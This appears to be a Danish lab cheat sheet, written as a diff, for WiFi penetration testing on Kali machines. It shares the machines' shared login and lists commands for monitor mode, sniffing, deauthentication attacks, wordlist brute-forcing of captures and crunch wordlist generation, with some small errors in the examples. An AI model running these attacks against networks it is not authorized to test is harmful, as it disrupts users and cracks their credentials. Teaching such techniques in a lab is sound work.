@@ -1,0 +1,30 @@
+---------Brugernavn // password til Kali maskiner---------
+stem // stem
+
+---------Nyttige kommandoer---------
+
+#--set monitor mode
+sudo ifconfig wlan1 down
+sudo airmon-ng check kill
+sudo iwconfig wlan1 mode monitor # monitor eller managed
+sudo ifconfig wlan1 up
+
+#--sniffing on all bands
+sudo airodump-ng --band abg  wlan1
+
+#--sniffing specific
+sudo airodump-ng --bssid macaddress --channel xx --write filename wlan1
+
+#--deauthenticating attack
+sudo aireplay-ng --deauth amont -a macaddress -c clientmacAddress wlan1
+
+#--brute force with wordlist
+sudo aircrack-ng captureFile.cap -w wordlist.txt | tee
+
+#--creating wordlist with crunch
+#--syntax: crunch [min][max][characters] -t[pattern] -o[filename]
+sudo crunch 6 8 123abc$ -t a@@@@b -o wordlist.txt
+#--generated example: aaaaab, aabbbb, aan$$b, ....... 
+
+---------Eksempel på kommando til at kombinere flere filer---------
+sudo cat filnavn1.txt filnavn2.txt filnavn3.txt filnavn4.txt > samletListe.txt
